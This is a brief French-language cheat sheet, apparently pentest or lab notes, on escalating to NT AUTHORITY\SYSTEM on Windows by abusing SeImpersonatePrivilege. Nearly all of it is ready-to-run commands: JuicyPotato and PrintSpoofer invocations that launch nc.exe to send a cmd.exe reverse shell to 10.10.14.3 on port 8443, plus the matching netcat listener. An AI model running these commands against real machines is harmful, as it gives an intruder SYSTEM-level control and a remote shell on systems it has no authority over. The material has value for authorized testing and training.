# SeImpersonatePrivileges Privesc

## SeImpersonatePrivilege

Avec ce privilège il est possible d'effectuer une privesc vers NT AUTHORIY\SYSTEM.

Utilisation de JuicyPotato.exe (ne fonctionne pas à partir de Windows Server 2019):

```powershell
JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```

```bash
nc -lnvp 8443
```

Utilisation de PrintSpoofer.exe:

```powershell
PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```

```bash
nc -lnvp 8443
```
